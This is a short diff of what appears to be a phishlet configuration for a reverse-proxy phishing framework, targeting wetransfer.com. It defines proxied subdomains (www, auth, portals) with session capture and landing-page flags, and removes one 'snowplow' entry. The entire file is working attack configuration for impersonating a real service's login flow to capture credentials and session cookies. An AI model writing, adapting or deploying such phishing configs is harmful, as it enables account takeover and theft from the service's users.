@@ -2,7 +2,6 @@ author: '@XC'
 min_ver: '2.3.0'
 
 proxy_hosts:
-  - {phish_sub: 'snowplow', orig_sub: 'snowplow', domain: 'wetransfer.com', session: true, is_landing: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'wetransfer.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: 'auth', orig_sub: 'auth', domain: 'wetransfer.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'portals', orig_sub: 'portals', domain: 'wetransfer.com', session: true, is_landing: false, auto_filter: true}
